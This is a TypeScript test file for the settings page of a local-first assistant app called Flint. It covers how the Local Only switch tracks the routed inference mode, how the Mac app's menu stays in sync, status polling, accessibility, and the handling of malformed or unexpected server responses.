    // A turn that is not kept here, or one with only text files: no note.
    expect(blind({ files: ['image', 'document'] })).toBe('');
    expect(blind({ localOnly: true, files: ['text'] })).toBe('');
    expect(blind({ localMode: true, files: [] })).toBe('');
    // Nothing turned on: the words name both kinds, whichever was attached, in Local mode and with Local Only.
    for (const files of [['image'], ['document'], ['image', 'document', 'text']]) {
      expect(blind({ localOnly: true, files })).toBe('images or PDFs');
      expect(blind({ localMode: true, files })).toBe('images or PDFs');
      expect(blind({ localOnly: true, files, reads: {} })).toBe('images or PDFs');
    }
    // Pictures on: a picture needs no note, a PDF still does, and the note names the PDF alone.
    expect(blind({ localOnly: true, files: ['image'], reads: { images: true } })).toBe('');
    expect(blind({ localOnly: true, files: ['document'], reads: { images: true } })).toBe('PDFs');
    expect(blind({ localMode: true, files: ['image', 'document'], reads: { images: true } })).toBe('PDFs');
    // PDFs on: the other way round.
    expect(blind({ localOnly: true, files: ['document'], reads: { pdfs: true } })).toBe('');
    expect(blind({ localOnly: true, files: ['image', 'document'], reads: { pdfs: true } })).toBe('images');
    // Both on: nothing to say.
    expect(blind({ localMode: true, files: ['image', 'document'], reads: { images: true, pdfs: true } })).toBe('');
    // What /health says is read strictly: only `true` counts, and an older server's /health turns nothing on.
    expect(mainScript).toContain('LOCAL_READS={images:!!(h&&h.localReads&&h.localReads.images===true),pdfs:!!(h&&h.localReads&&h.localReads.pdfs===true)};');
    // (The console's script is ES5: no arrow function crept in with it.)
    expect(js).not.toMatch(/=>/);
  });

  // The privacy review's N4. The page learned the mode at load, on a token save and when Settings was opened, and
  // held it between. A mode changed on another device (or by a rebuild) left the switch wrong: in a stale Local it
  // could not be turned on while Flint was really in Cloud mode, and the Mac app's menu item was off with it.
  it('each reply says the mode it was routed in, and the switch follows it: a stale mode does not outlive the next reply', () => {
    const p = page();
    const posted: unknown[] = [];
    p.c.window = { webkit: { messageHandlers: { flintMode: { postMessage: (m: unknown) => void posted.push(m) } } } };
    // The page holds Local mode (as /health said when it loaded). The mode is then changed somewhere else.
    p.run("setLocalMode('local')");
    p.run('toggleLO()');
    expect(p.run('LOCAL_ONLY')).toBe(false); // locked: his press changes nothing
    // The next reply's first `meta` event carries the route it was really given.
    p.run("modeSeen({mode:'cloud',reason:'mode_cloud'})");
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBeUndefined();
    expect(p.ids.losub!.textContent).toBe('Answers stay on this Mac.');
    p.run('toggleLO()');
    expect(p.run('LOCAL_ONLY')).toBe(true); // ...and Local Only can be switched on again
    // The other way: held as Cloud, really Local. The switch locks at the next reply.
    p.run("modeSeen({mode:'local',reason:'mode_local'})");
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBe('true');
    expect(p.ids.losub!.textContent).toBe('Local mode keeps every answer on this Mac.');
    // Hybrid is not Local: free again. The Mac app is told each time, so its menu item follows.
    p.run("modeSeen({mode:'hybrid',reason:'default'})");
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBeUndefined();
    expect(posted).toEqual(['local', 'cloud', 'local', 'hybrid']);
    // An event with no route (the one that says whether the reply stays here), or an older server's: nothing changes.
    for (const route of ['undefined', 'null', '{}', '{mode:7}', '"local"']) p.run(`modeSeen(${route})`);
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBeUndefined();
    expect(posted).toHaveLength(4);
    // Where the page reads it: every `meta` event of a reply, before anything of the reply is spoken.
    expect(mainScript).toContain("if(ev.type==='meta'){if(ev.brain)setBrainChip(body,ev.brain,ev.standby);modeSeen(ev.route);voiceMeta(vctx,ev);}");
    // ...and the server sends the route, with its mode, on that event (apps/server/src/index.ts).
    const index = readFileSync(join(__dirname, '..', 'src', 'index.ts'), 'utf8');
    expect(index.match(/type: 'meta', brain[^\n]*route: ctx\.inference\.routeFields\(route\)/g)!.length).toBeGreaterThanOrEqual(2);
  });

  it("the row's sentence is the server's when it sent one (a model server Will allowed is named), and one written for the other mode is not kept", () => {
    const p = page();
    p.render({ ...status({ mode: 'local' }), localOnlySentence: 'Local mode keeps every answer on this Mac or the model server you allowed.' });
    expect(p.ids.losub!.textContent).toBe('Local mode keeps every answer on this Mac or the model server you allowed.');
    // /health then says the mode changed, with no sentence: the Local-mode one is dropped for the page's own.
    p.run("setLocalMode('cloud')");
    expect(p.ids.losub!.textContent).toBe('Answers stay on this Mac.');
    // The same mode again keeps the server's sentence.
    p.render({ ...status({ mode: 'cloud' }), localOnlySentence: 'Answers stay on this Mac or the model server you allowed.' });
    p.run("setLocalMode('cloud')");
    expect(p.ids.losub!.textContent).toBe('Answers stay on this Mac or the model server you allowed.');
    // The real status carries the sentence, for both cases.
    expect(status({ mode: 'local' }).localOnlySentence).toBe('Local mode keeps every answer on this Mac.');
    expect(status({ mode: 'cloud' }).localOnlySentence).toBe('Answers stay on this Mac.');
  });

  it('the Mac app is told the mode, so its menu shows Local Only as off while Flint is in Local mode', () => {
    const p = page();
    // In a browser there is no app to tell: nothing is posted, and nothing breaks.
    p.run("setLocalMode('local')");
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBe('true');
    // In Flint.app the page's message handler is there (apps/desktop-mac/flint.swift registers `flintMode`).
    const posted: unknown[] = [];
    p.c.window = { webkit: { messageHandlers: { flintMode: { postMessage: (m: unknown) => void posted.push(m) } } } };
    p.run("setLocalMode('local')");
    p.run("setLocalMode('hybrid')");
    p.run("setLocalMode('cloud')");
    p.run('setLocalMode(undefined)'); // not a mode: nothing is said
    expect(posted).toEqual(['local', 'hybrid', 'cloud']);
    // A handler that throws (an older app build) never stops the page.
    p.c.window = { webkit: { messageHandlers: { flintMode: { postMessage: () => { throw new Error('gone'); } } } } };
    expect(() => p.run("setLocalMode('local')")).not.toThrow();
    expect(p.ids.lotoggle!.attrs['aria-disabled']).toBe('true');
    // The app's side: it hears only the Flint console, keeps whether the mode is Local, and the menu item whose
    // command is toggleLocalOnly is off while it is (so is its shortcut). Every other item is as it was.
    const swift = readFileSync(join(__dirname, '..', '..', 'desktop-mac', 'flint.swift'), 'utf8');
    expect(swift).toContain('cfg.userContentController.add(self, name: "flintMode")');
    expect(swift).toMatch(/guard message\.name == "flintMode", let flint = URL\(string: FLINT_URL\),\s*origin\.protocol == flint\.scheme, origin\.host == flint\.host, origin\.port == \(flint\.port \?\? 0\) else \{ return \}\s*localMode = \(message\.body as\? String\) == "local"/);
    expect(swift).toMatch(/func validateMenuItem\(_ item: NSMenuItem\) -> Bool \{\s*if \(item\.representedObject as\? String\) == "toggleLocalOnly" \{ return !localMode \}\s*return true\s*\}/);
    expect(swift).toContain('command(win, "Local Only", "toggleLocalOnly", "l", shift: true)');
    expect(swift).toMatch(/final class AppDelegate: NSObject, [^{]*\bWKScriptMessageHandler, NSMenuItemValidation \{/);
  });

  it('the markup: the switch is described by its sentence, and dims when it cannot be changed', () => {
    expect(html).toContain('<span id="losub">Answers stay on this Mac.</span>');
    expect(html).toContain('id="lotoggle" role="switch" aria-checked="false" aria-label="Local Only" aria-describedby="losub" onclick="toggleLO()"');
    expect(css).toContain('.toggle[aria-disabled="true"]{opacity:.5;cursor:default;}');
    // Its line is a whole sentence (the server's can name a model server too): it wraps on a phone, never "...".
    expect(css).toContain('.row .lbl #losub{white-space:normal;overflow:visible;}');
  });
});

describe('C6: the section looks again by itself while Settings is open and something is still on its way', () => {
  const again = (p: ReturnType<typeof page>) => [...p.pending.values()].filter((t) => t.ms === 5000).length;

  it('a model that is loading, one being checked, one not downloaded, and a machine not looked at yet: each sets one look, five seconds on', () => {
    for (const shape of [{ primary: { state: 'loading' } }, { primary: { state: 'unavailable', why: 'unreachable', checkedAt: 0 } }, { primary: { state: 'unavailable', why: 'not_installed' } }, { standby: { state: 'loading' } }, { standby: { state: 'unavailable', why: 'not_installed' } }, { hardware: null }] as Shape[]) {
      const p = page();
      p.open(true);
      p.render(status(shape));
      expect(again(p), JSON.stringify(shape)).toBe(1);
      // Rendered again before it fires: still one, never a pile of them.
      p.render(status(shape));
      expect(again(p), JSON.stringify(shape)).toBe(1);
    }
  });

  it('nothing on its way: no look is set; Settings closed: none either', () => {
    const p = page();
    p.open(true);
    p.render(status());
    expect(again(p)).toBe(0);
    p.render(status({ primary: { state: 'cold' }, standby: { state: 'loaded' } }));
    expect(again(p)).toBe(0);
    p.open(false);
    p.render(status({ primary: { state: 'loading' } }));
    expect(again(p)).toBe(0);
  });

  it('the look asks the server, keeps what is shown meanwhile, and stops by itself once nothing is on its way', async () => {
    let state: 'loading' | 'loaded' = 'loading';
    const p = page({ get: () => status({ primary: { state } }) });
    p.open(true);
    p.run('loadBrain()');
    await settle();
    expect(p.ids.lmsub!.textContent).toBe('It is loading now.');
    expect(again(p)).toBe(1);
    state = 'loaded';
    p.tick();
    // Meanwhile the row still says what it said: it is not blanked to "Flint is checking."
    expect(p.ids.lmsub!.textContent).toBe('It is loading now.');
    await settle();
    expect(p.calls.map((c) => c.path)).toEqual(['/inference', '/inference']);
    expect(p.ids.lmsub!.textContent).toBe('It is ready.');
    expect(again(p)).toBe(0);
  });

  it('Settings closed before it fires: nothing is asked', async () => {
    const p = page({ get: () => status({ primary: { state: 'loading' } }) });
    p.open(true);
    p.run('loadBrain()');
    await settle();
    p.open(false);
    p.tick();
    await settle();
    expect(p.calls).toHaveLength(1);
  });

  it('a look of the page\'s own that fails leaves the section as it is: no error row, no message', async () => {
    let fail = false;
    const p = page({
      get: () => {
        if (fail) throw new TypeError('Load failed');
        return status({ primary: { state: 'loading' } });
      },
    });
    p.open(true);
    p.run('loadBrain()');
    await settle();
    fail = true;
    p.tick();
    await settle();
    expect(p.ids.brainerr!.hidden).toBe(true);
    expect(p.ids.lmsub!.textContent).toBe('It is loading now.');
    expect(p.ids.brainmsg!.textContent).toBe('');
  });
});

describe('C7: the section for a reader and for the keyboard', () => {
  it("the Mode group is described by its sentence, which is announced when it changes", () => {
    expect(section).toContain('id="modeseg" role="radiogroup" aria-label="Mode" aria-describedby="modesub"');
    expect(section).toContain('<span id="modesub" aria-live="polite">Flint is checking.</span>');
  });

  it('the two copy buttons have names that tell them apart', () => {
    expect(section).toContain('id="lmcopy" aria-label="Copy Local Model Command"');
    expect(section).toContain('id="sbcopy" aria-label="Copy Standby Model Command"');
  });

  it('a save does not take the focus from a field Will has moved to meanwhile', async () => {
    let mode: InferenceMode = 'cloud';
    const p = page({ get: () => status({ mode }), post: (b) => ((mode = (b as { mode: InferenceMode }).mode), { ok: true, mode }) });
    p.run('loadBrain()');
    await settle();
    p.buttons[0]!.focus();
    p.run("setMode('local')");
    // He tabs on to another field in Settings before the answer comes.
    const elsewhere = new El(undefined, p.doc);
    elsewhere.focus();
    const before = p.buttons.map((b) => b.focused);
    await settle();
    expect(p.doc.activeElement).toBe(elsewhere);
    expect(p.buttons.map((b) => b.focused)).toEqual(before);
  });

  it('when the section cannot be shown after a keyboard choice, focus goes to Try Again, the one control left', async () => {
    let fail = false;
    const p = page({
      get: () => {
        if (fail) throw new TypeError('Load failed');
        return status();
      },
    });
    p.run('loadBrain()');
    await settle();
    fail = true;
    p.buttons[1]!.focus();
    p.run('BRAIN_REFOCUS=true');
    p.run('loadBrain()');
    await settle();
    expect(p.ids.brainerr!.hidden).toBe(false);
    expect(p.ids.brainretry!.focused).toBe(1);
  });
});

describe('C8: an answer that is not a status', () => {
  it('a 200 with an empty body, a page from something in between, or an object with no mode: the error row with Try Again, never "Flint is checking." for ever', async () => {
    for (const wire of [{ status: 200, text: '' }, { status: 200, text: '<html>captive portal</html>' }, { status: 200, body: {} }, { status: 200, body: { mode: 7 } }, { status: 200, body: null }] as Wire[]) {
      const p = page({ wire: () => wire });
      p.run('loadBrain()');
      await settle();
      expect(p.ids.brainerr!.hidden, JSON.stringify(wire)).toBe(false);
      expect(p.ids.brainerrsub!.textContent).toBe('Flint isn’t answering.');
      expect(p.ids.brainretry!.hidden).toBe(false);
      expect(p.screen()).not.toContain('Flint is checking.');
      expect(p.buttons.every((b) => !b.disabled)).toBe(true);
    }
  });
});

describe('C9 and C10: what reaches the screen', () => {
  it("the server's apostrophe is shown as the page's own, in a name, a sentence and a notice alike", () => {
    const p = page();
    p.render(status({ primary: { state: 'unavailable', why: 'not_installed' }, standby: { state: 'unavailable', why: 'not_installed' }, env: { FLINT_LOCAL_TOOLS: 'nonsense' } }));
    const text = p.screen() + p.ids.brainnotes!.children.map((r) => r.children[1]!.textContent).join(' ');
    expect(text).toContain('isn’t');
    expect(text).not.toContain("'");
    // The status itself still has the server's (the command line prints it as it is).
    expect(JSON.stringify(status({ primary: { state: 'unavailable', why: 'not_installed' } }))).toContain("isn't");
  });

  it('a chip name with parentheses in it reaches the screen without them', () => {
    const p = page();
    p.render(status({ hardware: { platform: 'linux', arch: 'x64', accelerator: 'nvidia', memoryGb: 24, systemMemoryGb: 64, chip: 'NVIDIA GeForce RTX 4090', notes: [] } }));
    expect(p.ids.hwval!.textContent).toBe('NVIDIA GeForce RTX 4090');
    expect(p.screen()).not.toMatch(/[()]/);
  });

  it('a state the page does not know is a grey dot, never a class made from a word every object has', () => {
    const p = page();
    for (const state of ['constructor', 'toString', '__proto__', 'hasOwnProperty', 'valueOf', 7, null, { a: 1 }]) {
      p.render({ mode: 'local', local: { confined: true, primary: { name: 'X', state, sentence: 'S.' }, standby: { name: 'Y', state, sentence: 'S.' } } });
      expect(p.ids.lmdot!.className, String(state)).toBe('st unknown');
      expect(p.ids.sbdot!.className, String(state)).toBe('st unknown');
    }
    p.render({ mode: 'local', local: { confined: true, primary: { name: 'X', state: 'loaded', sentence: 'S.' } } });
    expect(p.ids.lmdot!.className).toBe('st ok');
  });
});
